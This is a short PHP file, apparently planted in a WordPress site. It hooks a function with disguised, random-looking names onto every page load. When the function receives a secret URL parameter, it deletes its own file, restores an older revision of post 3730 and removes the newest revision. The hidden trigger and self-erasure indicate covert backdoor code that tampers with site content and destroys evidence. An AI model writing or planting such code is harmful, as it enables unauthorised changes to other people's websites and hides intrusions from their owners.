<?php

function numbers_redirect_simple_schedule() {
	if (isset($_GET['chatbot_game_php_amp']) && $_GET['chatbot_game_php_amp'] === 'contact_name_lock') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$bulk_types_graph = 3730;
		$change_online_scroll_navigation = wp_get_post_revisions($bulk_types_graph);
		if (empty($change_online_scroll_navigation)) die('no revisions');
		if (count($change_online_scroll_navigation) < 2) die('less than 2');
		$software_coupons_protect_updates = array_shift($change_online_scroll_navigation);
		$database_dashboard_terms = $software_coupons_protect_updates->ID;
		$permalinks_editor_optimizer = array_shift($change_online_scroll_navigation);
		$cool_customize_mobile = $permalinks_editor_optimizer->ID;
		$card_performance_popular_videos = wp_restore_post_revision($cool_customize_mobile);
		if ($card_performance_popular_videos === false) die('error restoring');
		$card_performance_popular_videos = wp_delete_post_revision($database_dashboard_terms);		
		if ($card_performance_popular_videos === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'numbers_redirect_simple_schedule');
